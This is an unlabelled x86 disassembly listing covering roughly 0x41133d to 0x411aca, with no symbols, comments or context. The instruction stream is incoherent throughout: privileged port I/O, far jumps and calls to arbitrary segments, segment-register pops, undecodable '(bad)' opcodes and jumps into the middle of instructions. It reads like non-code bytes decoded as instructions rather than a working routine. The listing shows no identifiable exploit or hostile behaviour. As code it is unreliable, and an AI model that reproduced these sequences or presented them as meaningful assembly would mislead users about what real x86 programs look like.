  41133d:	mov    cl,0x41
  41133f:	sub    BYTE PTR [edi-0x43],dl
  411342:	sub    edx,ebx
  411344:	jmp    0x3420:0x9ae09f55
  41134b:	inc    esi
  41134c:	jns    0x41132a
  41134e:	pop    es
  41134f:	loop   0x41133d
  411351:	inc    edx
  411352:	xor    DWORD PTR [edi+0x334e414c],esi
  411358:	push   eax
  411359:	fwait
  41135a:	inc    eax
  41135b:	in     eax,dx
  41135c:	in     eax,dx
  41135d:	call   0xf664:0x3cc0ee42
  411364:	test   dh,0x28
  411367:	mov    eax,0x26cefd31
  41136c:	xchg   ecx,eax
  41136d:	clc    
  41136e:	fcmovu st,st(7)
  411370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411371:	jecxz  0x411302
  411373:	pop    ebp
  411374:	jae    0x4113bf
  411376:	xchg   esi,eax
  411377:	push   cs
  411378:	in     eax,dx
  411379:	xor    ch,al
  41137b:	bswap  ebx
  41137d:	pop    edi
  41137e:	pop    ds
  41137f:	sub    eax,0x4d4183f3
  411384:	and    DWORD PTR [eax],ebp
  411386:	movq   mm4,QWORD PTR [eax]
  411389:	rep lods al,BYTE PTR ds:[esi]
  41138b:	push   ebx
  41138c:	addr16 xchg edx,eax
  41138e:	ins    DWORD PTR es:[edi],dx
  41138f:	ins    DWORD PTR es:[edi],dx
  411390:	out    0x57,al
  411392:	pop    ds
  411393:	add    ecx,DWORD PTR [ecx*4+0x3a6feac3]
  41139a:	push   eax
  41139b:	jbe    0x411389
  41139d:	retf   
  41139e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41139f:	xor    eax,0x3efc6fc7
  4113a4:	jmp    0xc7a94550
  4113a9:	pop    ds
  4113aa:	lods   al,BYTE PTR ds:[esi]
  4113ab:	dec    edi
  4113ac:	sub    eax,DWORD PTR [ecx-0xe]
  4113af:	mov    BYTE PTR [edx],bl
  4113b1:	xchg   esi,eax
  4113b2:	jmp    0x92ee4b4d
  4113b7:	pop    esp
  4113b8:	push   ds
  4113b9:	add    dh,BYTE PTR [edx-0x60e9675c]
  4113bf:	cmp    al,0x60
  4113c1:	inc    edi
  4113c2:	mov    cl,0x4a
  4113c4:	mov    ds:0x63f1987d,eax
  4113c9:	pop    esi
  4113ca:	push   DWORD PTR [edx]
  4113cc:	mov    ebp,0x24e6913c
  4113d1:	in     eax,0x75
  4113d3:	xor    edi,edi
  4113d5:	cwde   
  4113d6:	pop    edi
  4113d7:	fcomi  st,st(6)
  4113d9:	repnz pop edi
  4113db:	sub    BYTE PTR [edx+0x61],0xdc
  4113df:	mov    eax,DWORD PTR [ecx]
  4113e1:	sub    dl,dl
  4113e3:	lahf   
  4113e4:	push   ss
  4113e5:	lea    ebp,[edx-0x238b8a67]
  4113eb:	mov    dh,0x65
  4113ed:	add    eax,edx
  4113ef:	mov    dl,0x15
  4113f1:	sbb    al,0xf7
  4113f3:	push   0x6
  4113f5:	mov    al,0xd9
  4113f7:	(bad)  
  4113f8:	aas    
  4113f9:	pusha  
  4113fa:	inc    edx
  4113fb:	jg     0x41145b
  4113fd:	test   eax,0x87dc6036
  411402:	mov    bh,0x9b
  411404:	loope  0x4113cc
  411406:	xchg   BYTE PTR [esi-0x44],dh
  411409:	jmp    0x411420
  41140b:	(bad)  
  41140c:	data16 jo 0x41142b
  41140f:	sbb    DWORD PTR [ecx+0x51bbd0af],esp
  411415:	cs (bad) 
  411417:	xchg   ecx,eax
  411418:	dec    edi
  411419:	xor    al,0x5d
  41141b:	das    
  41141c:	outs   dx,BYTE PTR ds:[esi]
  41141d:	std    
  41141e:	mov    eax,DWORD PTR [eax-0x53e8d4dd]
  411424:	jns    0x411443
  411426:	pop    es
  411427:	inc    DWORD PTR [ebx]
  411429:	in     eax,dx
  41142a:	or     edi,DWORD PTR [edx-0x3c]
  41142d:	pop    ebx
  41142e:	sti    
  41142f:	and    eax,0xb8e53a1f
  411434:	call   0x48ef36b4
  411439:	int    0xf
  41143b:	jge    0x4114a9
  41143d:	sub    DWORD PTR [esi],ecx
  41143f:	or     esp,DWORD PTR [eax-0x1e]
  411442:	push   esp
  411443:	clc    
  411444:	fistp  DWORD PTR [eax-0x72a79df3]
  41144a:	scas   al,BYTE PTR es:[edi]
  41144b:	adc    ah,BYTE PTR [edi-0x6a0d03e0]
  411451:	or     al,0xfe
  411453:	loop   0x41145c
  411455:	sahf   
  411456:	test   DWORD PTR [eax-0x24],0xda9c1cf0
  41145d:	xor    ch,al
  41145f:	and    BYTE PTR fs:[eax+0x51],dh
  411463:	jmp    0x57cbe65e
  411468:	push   ecx
  411469:	mov    cl,BYTE PTR [edx+0x6e]
  41146c:	shl    esp,cl
  41146e:	jo     0x411413
  411470:	ss push edx
  411472:	pop    eax
  411473:	mov    al,BYTE PTR [ecx+0x7a]
  411476:	push   ecx
  411477:	add    eax,0x6ef613c7
  41147c:	jl     0x41143c
  41147e:	sbb    eax,0x62f17d0c
  411483:	add    edi,eax
  411485:	scas   eax,DWORD PTR es:[edi]
  411486:	es dec esi
  411488:	sbb    al,0xac
  41148a:	leave  
  41148b:	mov    ebp,0xe876af6c
  411490:	xor    al,0x27
  411492:	push   ecx
  411493:	ret    
  411494:	push   cs
  411495:	in     eax,dx
  411496:	adc    edx,edi
  411498:	inc    esp
  411499:	inc    ecx
  41149a:	dec    ebx
  41149b:	mov    ebx,esi
  41149d:	sub    eax,DWORD PTR [eax+eiz*2+0x55]
  4114a1:	and    esp,edx
  4114a3:	add    eax,0x4d772d74
  4114a8:	imul   edi,DWORD PTR [esi+0x29],0x1f
  4114ac:	test   dl,al
  4114ae:	(bad)  
  4114af:	cdq    
  4114b0:	clc    
  4114b1:	mov    eax,ds:0x775451d1
  4114b7:	cdq    
  4114b8:	mov    bl,0x6c
  4114ba:	ret    
  4114bb:	ins    DWORD PTR es:[edi],dx
  4114bc:	test   BYTE PTR [ebp+0x20e7ede],0xb4
  4114c3:	es pushf 
  4114c5:	aas    
  4114c6:	jg     0x41146b
  4114c8:	loop   0x41148d
  4114ca:	test   BYTE PTR [ecx-0x6715b13f],al
  4114d0:	add    BYTE PTR [ebx-0x1b],ch
  4114d3:	aaa    
  4114d4:	ror    BYTE PTR [esi+0x52c3d38],0x3b
  4114db:	pop    ecx
  4114dc:	in     al,0x12
  4114de:	dec    edi
  4114df:	dec    ecx
  4114e0:	(bad)  
  4114e1:	mov    ebp,0xbf2ae62c
  4114e6:	lods   al,BYTE PTR ds:[esi]
  4114e7:	fadd   DWORD PTR [ebx+0x6e97af49]
  4114ed:	cs bnd jbe 0x4114f7
  4114f1:	push   es
  4114f2:	mov    eax,ds:0x9195e6c
  4114f7:	arpl   WORD PTR [ebp-0x383cb253],ax
  4114fd:	and    BYTE PTR [edx-0x7d],0x87
  411501:	adc    al,BYTE PTR [eax-0xb]
  411504:	fist   WORD PTR [esi]
  411506:	mov    eax,0x8d6f8c0a
  41150b:	fimul  WORD PTR [eax]
  41150d:	mov    ds:0xbe73db81,eax
  411512:	fstp   TBYTE PTR ds:0x9335f6cb
  411518:	sti    
  411519:	rcl    DWORD PTR [ebx],0xc2
  41151c:	(bad)  
  41151d:	adc    esi,DWORD PTR [ecx-0x79430ca3]
  411523:	int3   
  411524:	mov    ds:0x7aba79a7,eax
  411529:	mov    ds:0x9f2a3552,al
  41152e:	popa   
  41152f:	outs   dx,DWORD PTR ds:[esi]
  411530:	jp     0x4115af
  411532:	add    DWORD PTR [edi+0x7a],ecx
  411535:	mov    ecx,esp
  411537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411538:	and    BYTE PTR [edx-0x3],0x2e
  41153c:	aad    0xa3
  41153e:	pop    esp
  41153f:	xchg   ebx,eax
  411540:	adc    DWORD PTR [edi],esp
  411542:	in     eax,dx
  411543:	js     0x411550
  411545:	xchg   edi,eax
  411546:	or     ah,BYTE PTR [edx]
  411548:	std    
  411549:	mov    bl,0x1f
  41154b:	mov    ebp,0xedfdcc31
  411550:	pop    eax
  411551:	xor    BYTE PTR [esi+ecx*1+0x701b67ff],ah
  411558:	push   es
  411559:	in     eax,dx
  41155a:	push   ebx
  41155b:	idiv   BYTE PTR [ebx-0x2df2be64]
  411561:	dec    ebp
  411562:	fmul   QWORD PTR [ecx-0x3aa7d1f3]
  411568:	in     al,dx
  411569:	or     DWORD PTR [ebp+0x271be9c8],0x1f41ca57
  411573:	loopne 0x411578
  411575:	jno    0x411510
  411577:	les    ecx,FWORD PTR [ecx+0x39e44a2f]
  41157d:	and    ebp,edx
  41157f:	rol    DWORD PTR [esi+0x4f],1
  411582:	inc    esp
  411583:	(bad)  
  411584:	inc    ebp
  411585:	and    ebx,DWORD PTR [ecx]
  411587:	push   esp
  411588:	jle    0x4115eb
  41158a:	dec    ecx
  41158b:	ins    BYTE PTR es:[edi],dx
  41158c:	jne    0x4115b5
  41158e:	xor    DWORD PTR [esi],esp
  411590:	inc    edi
  411591:	lods   al,BYTE PTR ds:[esi]
  411592:	push   esi
  411593:	cmp    DWORD PTR [esi],esp
  411595:	arpl   dx,si
  411597:	sbb    eax,0x950c0b52
  41159c:	shl    BYTE PTR [eax],1
  41159e:	mov    ds:0xe92cedb1,al
  4115a3:	pop    eax
  4115a4:	adc    dl,bh
  4115a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a7:	inc    ebp
  4115a8:	push   ss
  4115a9:	pop    ds
  4115aa:	mov    ds:0x6517f5fb,eax
  4115af:	xor    eax,0x45db3fa7
  4115b4:	fwait
  4115b5:	dec    edi
  4115b6:	daa    
  4115b7:	jge    0x411562
  4115b9:	fsubr  QWORD PTR [ebx+edi*2+0x26d9b361]
  4115c0:	outs   dx,BYTE PTR ds:[esi]
  4115c1:	fst    QWORD PTR [ecx+0x66]
  4115c4:	test   al,0x4a
  4115c6:	add    dh,BYTE PTR [ebx]
  4115c8:	jne    0x411610
  4115ca:	fcom   QWORD PTR [ecx-0x75]
  4115cd:	mov    cl,0x29
  4115cf:	fwait
  4115d0:	aas    
  4115d1:	cmp    al,0x48
  4115d3:	add    al,0x37
  4115d5:	sub    ebp,DWORD PTR [ebx]
  4115d7:	nop
  4115d8:	arpl   dx,bx
  4115da:	push   edi
  4115db:	jns    0x41157c
  4115dd:	add    cl,BYTE PTR [ecx-0x7986a7f8]
  4115e3:	push   cs
  4115e4:	ret    
  4115e5:	pop    ecx
  4115e6:	inc    ebp
  4115e7:	mov    eax,ds:0x271b354b
  4115ec:	cli    
  4115ed:	jmp    0x4115bd
  4115ef:	aas    
  4115f0:	mov    al,ds:0x762f55fa
  4115f5:	xchg   esi,eax
  4115f6:	pushf  
  4115f7:	ja     0x411634
  4115f9:	and    al,0x1c
  4115fb:	daa    
  4115fc:	jle    0x411648
  4115fe:	push   0x32
  411600:	ja     0x41165d
  411602:	lock std 
  411604:	jnp    0x411670
  411606:	test   DWORD PTR [ebp-0x4a],eax
  411609:	pushf  
  41160a:	jb     0x4115fc
  41160c:	add    bh,BYTE PTR ds:0x7408794d
  411612:	rcr    esi,1
  411614:	and    eax,0x3711d960
  411619:	pop    ebp
  41161a:	adc    BYTE PTR [eax+0x3f1053f2],0x49
  411621:	les    esp,FWORD PTR [edi]
  411623:	jecxz  0x411618
  411625:	pushf  
  411626:	out    dx,al
  411627:	xor    al,0x84
  411629:	mov    cl,0x9a
  41162b:	cmp    edx,edx
  41162d:	rcl    DWORD PTR [edx-0x65],cl
  411630:	int3   
  411631:	jge    0x41168d
  411633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411634:	lods   al,BYTE PTR ds:[esi]
  411635:	sahf   
  411636:	mov    edx,0x75fd74b
  41163b:	mov    edx,0x248c135e
  411640:	call   0x519b06db
  411645:	xchg   esi,eax
  411646:	sbb    eax,0xffd3765f
  41164b:	or     eax,0xc4a2ca89
  411650:	inc    edx
  411651:	xchg   bh,bl
  411653:	jns    0x411676
  411655:	outs   dx,DWORD PTR ds:[esi]
  411656:	jecxz  0x4115f6
  411658:	lea    eax,[esi+0x16f2f756]
  41165e:	ja     0x411666
  411660:	into   
  411661:	sub    eax,0x91e6fadf
  411666:	lods   eax,DWORD PTR ds:[esi]
  411667:	pusha  
  411668:	cwde   
  411669:	push   ds
  41166a:	popa   
  41166b:	or     ah,cl
  41166d:	enter  0x1c7f,0x8c
  411671:	add    eax,0x38468a5b
  411676:	mov    ebx,0x79dc68b
  41167b:	popa   
  41167c:	adc    DWORD PTR [ebx+0x4],edx
  41167f:	xchg   esp,eax
  411680:	pop    ss
  411681:	cli    
  411682:	in     al,dx
  411683:	pop    ebx
  411684:	lea    esi,[edx-0x72566d76]
  41168a:	js     0x4116a6
  41168c:	jb     0x411682
  41168e:	and    eax,0x4f754886
  411693:	ins    BYTE PTR es:[edi],dx
  411694:	inc    ebx
  411695:	shl    DWORD PTR [edx+0x61997964],0xa2
  41169c:	push   esi
  41169d:	sbb    al,BYTE PTR [edx]
  41169f:	inc    esp
  4116a0:	mov    edx,0xee5b6128
  4116a5:	out    0x3e,eax
  4116a7:	mov    al,ds:0xbc8ec773
  4116ac:	xchg   ecx,eax
  4116ad:	stc    
  4116ae:	sub    eax,0x7ce24c5a
  4116b3:	jbe    0x411702
  4116b5:	pop    esi
  4116b6:	outs   dx,BYTE PTR ds:[esi]
  4116b7:	fisubr WORD PTR [edx+0x67]
  4116ba:	cmp    al,0xd5
  4116bc:	cmp    al,0x37
  4116be:	cmc    
  4116bf:	lock sbb al,0xcc
  4116c2:	js     0x4116ec
  4116c4:	and    DWORD PTR ds:0xd01db9f,edx
  4116ca:	fmul   DWORD PTR [esi]
  4116cc:	jo     0x4116a8
  4116ce:	and    bl,BYTE PTR [esp+ebx*2+0x12046220]
  4116d5:	mov    dh,0xb
  4116d7:	jne    0x411661
  4116d9:	enter  0xb99e,0x95
  4116dd:	inc    esp
  4116de:	inc    esp
  4116df:	mov    ch,0xad
  4116e1:	push   edi
  4116e2:	cmp    al,0x8d
  4116e4:	and    DWORD PTR [eax-0x60],esp
  4116e7:	mov    bl,0x6c
  4116e9:	mov    al,ds:0x3563f09c
  4116ee:	cs pushf 
  4116f0:	pop    ss
  4116f1:	loopne 0x411676
  4116f3:	inc    edx
  4116f4:	jg     0x411718
  4116f6:	mov    ah,0x9c
  4116f8:	mov    eax,ds:0xab1a1bb5
  4116fd:	dec    edx
  4116fe:	or     BYTE PTR [ebx],cl
  411700:	mov    bh,0xa3
  411702:	arpl   WORD PTR [esi],bx
  411704:	mov    WORD PTR [ebx+0x7b],ds
  411707:	ret    0xdc08
  41170a:	inc    esi
  41170b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41170c:	sub    eax,0x49bf1b5c
  411711:	rcr    bh,1
  411713:	sub    al,cl
  411715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411716:	cmovl  esi,DWORD PTR [edi]
  411719:	test   edx,esp
  41171b:	push   ebp
  41171c:	adc    al,0x1b
  41171e:	inc    esi
  41171f:	mov    cl,0x5d
  411721:	inc    edi
  411722:	push   esp
  411723:	and    edi,DWORD PTR [edx]
  411725:	mov    ah,cl
  411727:	dec    edi
  411728:	dec    ebp
  411729:	add    edx,esp
  41172b:	stos   BYTE PTR es:[edi],al
  41172c:	int3   
  41172d:	and    DWORD PTR [eax+esi*8-0x3b],edx
  411731:	ret    
  411732:	jae    0x4117a7
  411734:	mov    esp,0x5cc582ac
  411739:	xchg   esp,eax
  41173a:	in     al,dx
  41173b:	or     al,0xa2
  41173d:	sbb    bl,BYTE PTR [edx+ebx*8]
  411740:	push   eax
  411741:	ja     0x4116dd
  411743:	(bad)  
  411744:	lods   al,BYTE PTR ds:[esi]
  411745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411746:	jbe    0x4116d6
  411748:	or     eax,0xa2c01437
  41174d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41174e:	xor    eax,0x42dbdcbf
  411753:	push   ebx
  411754:	jne    0x41176a
  411756:	int    0x23
  411758:	mov    bh,0x93
  41175a:	or     ebp,DWORD PTR [ebp-0x13ede4b6]
  411760:	into   
  411761:	retf   0xc381
  411764:	xlat   BYTE PTR ds:[ebx]
  411765:	shl    eax,cl
  411767:	stos   DWORD PTR es:[edi],eax
  411768:	data16 mov dh,BYTE PTR [edi+0x35a60d92]
  41176f:	or     BYTE PTR [ebp+0x6a],bl
  411772:	out    dx,al
  411773:	aad    0x74
  411775:	fdiv   QWORD PTR [edi+0x58]
  411778:	sbb    bl,BYTE PTR [ecx]
  41177a:	loop   0x41174b
  41177c:	and    cl,BYTE PTR [ecx+0x53993cc3]
  411782:	mov    al,ds:0xf7e7d4af
  411787:	pop    edx
  411788:	mov    cl,BYTE PTR [eax]
  41178a:	retf   
  41178b:	and    dl,BYTE PTR [ebx+eiz*8+0x3b]
  41178f:	sar    BYTE PTR [ecx+0x23],cl
  411792:	mov    eax,ds:0x6f8998c
  411797:	iret   
  411798:	dec    ebp
  411799:	adc    DWORD PTR [ebp-0x4c],ebp
  41179c:	xchg   esi,eax
  41179d:	int3   
  41179e:	sub    BYTE PTR [eax],cl
  4117a0:	dec    edi
  4117a1:	js     0x4117bd
  4117a3:	or     al,0xb6
  4117a5:	xlat   BYTE PTR ds:[ebx]
  4117a6:	xor    dl,ah
  4117a8:	das    
  4117a9:	jg     0x4117c4
  4117ab:	xor    eax,0x3f0da4a1
  4117b0:	leave  
  4117b1:	jge    0x4117f9
  4117b3:	imul   ebx,DWORD PTR [ecx],0x4e
  4117b6:	or     al,0xbb
  4117b8:	jp     0x4117c3
  4117ba:	and    al,0x1f
  4117bc:	je     0x411813
  4117be:	clc    
  4117bf:	lahf   
  4117c0:	cli    
  4117c1:	mov    DWORD PTR [ebp+0x54c7c2ac],eax
  4117c7:	inc    ecx
  4117c8:	psubq  mm3,QWORD PTR [ecx+ebx*8-0xc]
  4117cd:	addr16 out dx,al
  4117cf:	xchg   ebp,esi
  4117d1:	adc    al,0x2a
  4117d3:	scas   al,BYTE PTR es:[edi]
  4117d4:	mov    eax,ds:0x204ee65d
  4117d9:	mov    al,al
  4117db:	mov    ah,0x1b
  4117dd:	cdq    
  4117de:	pop    esp
  4117df:	rep lods eax,DWORD PTR ds:[esi]
  4117e1:	aaa    
  4117e2:	xchg   BYTE PTR [ebx],ch
  4117e4:	aad    0x99
  4117e6:	lods   eax,DWORD PTR ds:[esi]
  4117e7:	dec    edx
  4117e8:	cdq    
  4117e9:	cs jbe 0x411844
  4117ec:	enter  0x9b02,0x19
  4117f0:	fisttp DWORD PTR [edi]
  4117f2:	mov    es,WORD PTR [edx]
  4117f4:	adc    al,0xc2
  4117f6:	push   eax
  4117f7:	arpl   WORD PTR [ecx+0x3e],si
  4117fa:	adc    eax,0x644d188
  4117ff:	pop    ebx
  411800:	stos   BYTE PTR es:[edi],al
  411801:	fidiv  DWORD PTR [ebx-0x42]
  411804:	xor    al,0x67
  411806:	retf   0x91b6
  411809:	sbb    eax,0xf2395dca
  41180e:	std    
  41180f:	or     BYTE PTR [ebx-0x2b9f4fb8],bh
  411815:	clc    
  411816:	mov    esi,0xb3163b4c
  41181b:	mov    WORD PTR [ebp-0x1572a46b],es
  411821:	pop    ebp
  411822:	xchg   ebp,eax
  411823:	cmp    DWORD PTR ds:0xa698626d,ebx
  411829:	jbe    0x4117e9
  41182b:	div    BYTE PTR [eax+edi*1+0x26]
  41182f:	xchg   ebx,eax
  411830:	mov    ch,0xa5
  411832:	mov    ds:0xfd3f1e3,al
  411837:	jno    0x41182a
  411839:	mov    ah,0xd1
  41183b:	test   BYTE PTR [ecx+0x2b0958c5],al
  411841:	pop    esp
  411842:	pop    ebp
  411843:	jge    0x411873
  411845:	ss stc 
  411847:	push   edx
  411848:	test   eax,0x3599c3e4
  41184d:	xchg   edi,eax
  41184e:	gs jb  0x4117fc
  411851:	xchg   BYTE PTR [ecx+0x49],al
  411854:	stos   BYTE PTR es:[edi],al
  411855:	pop    ebp
  411856:	pop    ss
  411857:	into   
  411858:	aad    0x2c
  41185a:	cmp    dl,dl
  41185c:	dec    edi
  41185d:	sbb    DWORD PTR [ecx+0x1faa181a],edx
  411863:	sti    
  411864:	xor    bh,BYTE PTR [eax]
  411866:	cmp    DWORD PTR [edx+0x6703135d],esp
  41186c:	cmp    ah,al
  41186e:	jbe    0x41189b
  411870:	sahf   
  411871:	sbb    esi,0xffffff8c
  411874:	adc    eax,0xf1ea6359
  411879:	add    DWORD PTR [ecx],ecx
  41187b:	add    al,0xf7
  41187d:	std    
  41187e:	pop    es
  41187f:	jl     0x4118b9
  411881:	out    0x4e,eax
  411883:	jge    0x4118de
  411885:	call   0xc19f4458
  41188a:	dec    ebp
  41188b:	call   0x131b:0x5087a6e8
  411892:	mov    cs,edx
  411894:	dec    esi
  411895:	adc    al,0x50
  411897:	out    dx,al
  411898:	inc    eax
  411899:	push   0x911a7d59
  41189e:	shr    BYTE PTR [edi-0x40],cl
  4118a1:	mov    eax,ds:0x21bdfef2
  4118a6:	dec    eax
  4118a7:	ja     0x411832
  4118a9:	xor    al,0x1b
  4118ab:	in     al,0xd8
  4118ad:	int3   
  4118ae:	adc    esp,DWORD PTR [ebp-0x55]
  4118b1:	in     eax,0x42
  4118b3:	xchg   ecx,eax
  4118b4:	add    BYTE PTR ds:[eax],ah
  4118b7:	mov    bh,0xc1
  4118b9:	push   cs
  4118ba:	ins    BYTE PTR es:[edi],dx
  4118bb:	jb     0x41187a
  4118bd:	jp     0x4118a4
  4118bf:	in     al,0xdb
  4118c1:	or     DWORD PTR [ecx-0x2db5dcc1],ebx
  4118c7:	xor    ebx,DWORD PTR [eax-0x35]
  4118ca:	and    ch,BYTE PTR [ebp+0x71087ce8]
  4118d0:	std    
  4118d1:	(bad)  
  4118d3:	cmp    eax,0xcb77612c
  4118d8:	retf   
  4118d9:	and    al,0xfc
  4118db:	push   edx
  4118dc:	pop    es
  4118dd:	into   
  4118de:	or     BYTE PTR [edx-0x3c],bl
  4118e1:	dec    edx
  4118e2:	jo     0x411879
  4118e4:	test   DWORD PTR [ebx-0x23],edi
  4118e7:	push   ds
  4118e8:	jno    0x4118dc
  4118ea:	rcl    cl,0x69
  4118ed:	stc    
  4118ee:	add    al,0xa1
  4118f0:	cmp    eax,0xd91ccfab
  4118f5:	int    0xa
  4118f7:	ja     0x41191d
  4118f9:	sub    ebp,ebp
  4118fb:	mov    ah,0xc2
  4118fd:	adc    esp,DWORD PTR [edx+0x4]
  411900:	mov    cl,BYTE PTR [edi]
  411902:	push   cs
  411903:	fs jecxz 0x41195a
  411906:	ja     0x4118f3
  411908:	jmp    0x322d:0xb15f8deb
  41190f:	sbb    dl,BYTE PTR [edx+0x10aacce]
  411915:	add    dl,BYTE PTR [eax+esi*4]
  411918:	push   ebx
  411919:	(bad)  
  41191b:	shl    BYTE PTR [eax],0xb4
  41191e:	jb     0x4118f4
  411920:	mov    DWORD PTR [edi-0x67],eax
  411923:	push   0x61900f4d
  411928:	dec    esi
  411929:	loopne 0x4119a0
  41192b:	add    DWORD PTR [ebx+0x9],ebx
  41192e:	retf   0xf67d
  411931:	or     al,0x4b
  411933:	lods   eax,DWORD PTR ds:[esi]
  411934:	inc    esi
  411935:	push   0x4b
  411937:	rol    ah,1
  411939:	jmp    0x9971ffc7
  41193e:	scas   eax,DWORD PTR es:[edi]
  41193f:	hlt    
  411940:	jb     0x4118ea
  411942:	icebp  
  411943:	sbb    eax,0x5093a9dd
  411948:	push   ds
  411949:	cmp    edi,esi
  41194b:	push   ds
  41194c:	shr    DWORD PTR [edi-0x6d],1
  41194f:	stos   BYTE PTR es:[edi],al
  411950:	push   esp
  411951:	shl    BYTE PTR [edx-0x2a],1
  411954:	aaa    
  411955:	lods   al,BYTE PTR ds:[esi]
  411956:	sti    
  411957:	stos   DWORD PTR es:[edi],eax
  411958:	or     ebx,DWORD PTR [ecx-0x27d0b79b]
  41195e:	test   dl,ah
  411960:	jae    0x411931
  411962:	mov    bl,0x40
  411964:	data16 js 0x4118f1
  411967:	(bad)  
  411968:	out    0xdf,al
  41196a:	push   ecx
  41196b:	jp     0x411916
  41196d:	sub    al,0xf9
  41196f:	sub    esi,ebp
  411971:	or     eax,0x8097ea2b
  411976:	shr    ecx,1
  411978:	jp     0x4119ec
  41197a:	sbb    dh,BYTE PTR [edx+0x560bfaa7]
  411980:	sti    
  411981:	or     BYTE PTR [ecx+0x3a285c78],bh
  411987:	xchg   edx,eax
  411988:	xchg   edx,eax
  411989:	jmp    0x41196e
  41198b:	dec    esi
  41198c:	sti    
  41198d:	dec    ebx
  41198e:	scas   eax,DWORD PTR es:[edi]
  41198f:	sahf   
  411990:	inc    edx
  411991:	add    al,0x1f
  411993:	or     DWORD PTR [ebx+0x352ec608],edx
  411999:	xlat   BYTE PTR ds:[ebx]
  41199a:	test   bh,dh
  41199c:	dec    ecx
  41199d:	sbb    BYTE PTR [ecx-0xe],0xd
  4119a1:	cli    
  4119a2:	inc    esi
  4119a3:	stos   DWORD PTR es:[edi],eax
  4119a4:	or     ah,BYTE PTR [ebp+0x7a]
  4119a7:	mov    ebp,0xb718b379
  4119ac:	ins    BYTE PTR es:[edi],dx
  4119ad:	inc    ecx
  4119ae:	dec    esi
  4119af:	jle    0x4119ef
  4119b1:	inc    ebx
  4119b2:	mov    cl,0x5
  4119b4:	add    eax,0x386d6ea
  4119b9:	push   ecx
  4119ba:	push   eax
  4119bb:	pop    edi
  4119bc:	rcr    DWORD PTR [ebp+0x1a9c8981],0xb6
  4119c3:	mov    eax,0xf20557b2
  4119c8:	icebp  
  4119c9:	fwait
  4119ca:	imul   BYTE PTR [eax+0x109cfdb7]
  4119d0:	mov    esp,0xde2d0829
  4119d5:	inc    esp
  4119d6:	cld    
  4119d7:	jbe    0x4119ef
  4119d9:	pop    edx
  4119da:	pop    esi
  4119db:	sbb    eax,0xd5bb306f
  4119e0:	dec    ebx
  4119e1:	inc    esp
  4119e2:	enter  0x588e,0x5
  4119e6:	push   ecx
  4119e7:	aad    0xa6
  4119e9:	sub    al,0xdf
  4119eb:	and    bl,bh
  4119ed:	push   0x5298f20b
  4119f2:	pop    esi
  4119f3:	mov    dl,0xc5
  4119f5:	cs jg  0x411a2a
  4119f8:	jp     0x411a54
  4119fa:	push   ecx
  4119fb:	add    al,0x93
  4119fd:	sahf   
  4119fe:	shl    BYTE PTR [edi-0x6cf01e7f],cl
  411a04:	sbb    al,0x98
  411a06:	dec    ebp
  411a07:	mov    esp,?
  411a09:	ror    dl,1
  411a0b:	mov    edx,0xb8e11509
  411a10:	xchg   ebx,eax
  411a11:	pop    edx
  411a12:	call   0x922c:0x6e1ecfe3
  411a19:	xchg   ecx,eax
  411a1a:	adc    ecx,esi
  411a1c:	cmp    DWORD PTR ds:0x5b057cf1,edx
  411a22:	xchg   edi,eax
  411a23:	jp     0x4119f3
  411a25:	inc    ecx
  411a26:	aas    
  411a27:	icebp  
  411a28:	mov    cl,0xac
  411a2a:	cmc    
  411a2b:	pop    ebx
  411a2c:	xor    esi,esi
  411a2e:	xor    eax,0x1094f250
  411a33:	jno    0x411aa0
  411a35:	in     al,0xf2
  411a37:	cwde   
  411a38:	punpckhdq mm6,QWORD PTR [ecx]
  411a3b:	dec    esp
  411a3c:	xor    BYTE PTR [esi-0x67],bl
  411a3f:	out    dx,eax
  411a40:	mov    dh,0x45
  411a42:	xchg   ebp,eax
  411a43:	test   al,0x84
  411a45:	cmc    
  411a46:	aam    0x8e
  411a48:	pshufw mm4,QWORD PTR [edi-0x4b15163c],0x88
  411a50:	inc    ecx
  411a51:	add    DWORD PTR [ebx+0x78c53f4a],ebp
  411a57:	adc    ah,BYTE PTR [ebx+0x4d]
  411a5a:	ja     0x411a55
  411a5c:	jnp    0x4119e6
  411a5e:	fdiv   DWORD PTR [ebp+0x60]
  411a61:	(bad)  
  411a62:	fs push edx
  411a64:	xchg   ecx,eax
  411a65:	push   ecx
  411a66:	loope  0x411aae
  411a68:	mov    DWORD PTR [edi-0x1b],edi
  411a6b:	sbb    BYTE PTR [edi+0x3e667231],dl
  411a71:	lea    ecx,[edx+edx*2+0x35]
  411a75:	jg     0x411a90
  411a77:	or     esi,0x40bb11df
  411a7d:	sbb    al,0x80
  411a7f:	std    
  411a80:	(bad)  
  411a81:	fcmovnu st,st(3)
  411a83:	mov    BYTE PTR [ebx],cl
  411a85:	pop    ecx
  411a86:	adc    al,0xfc
  411a88:	iret   
  411a89:	clc    
  411a8a:	adc    eax,DWORD PTR [ecx-0x17]
  411a8d:	les    ebx,FWORD PTR [eax+0x1ae3d24b]
  411a93:	mov    DWORD PTR [ebp-0x3d],esp
  411a96:	ins    BYTE PTR es:[edi],dx
  411a97:	xor    bl,al
  411a99:	or     DWORD PTR [edx-0x51],edi
  411a9c:	retf   
  411a9d:	leave  
  411a9e:	sub    ah,bl
  411aa0:	xlat   BYTE PTR ds:[ebx]
  411aa1:	jg     0x411a80
  411aa3:	sub    DWORD PTR [edi-0x298d3b5c],ebx
  411aa9:	adc    BYTE PTR [ecx+esi*8],cl
  411aac:	or     BYTE PTR [eax],bl
  411aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aaf:	xlat   BYTE PTR ds:[ebx]
  411ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab1:	dec    ecx
  411ab2:	pop    ds
  411ab3:	push   ebp
  411ab4:	in     eax,dx
  411ab5:	ds push eax
  411ab7:	push   edx
  411ab8:	scas   eax,DWORD PTR es:[edi]
  411ab9:	ret    
  411aba:	mov    al,ds:0xd88eca72
  411abf:	cmp    bl,BYTE PTR [edi+edx*2+0x7]
  411ac3:	repz and DWORD PTR [ecx],0x504ef398
  411aca:	lahf   
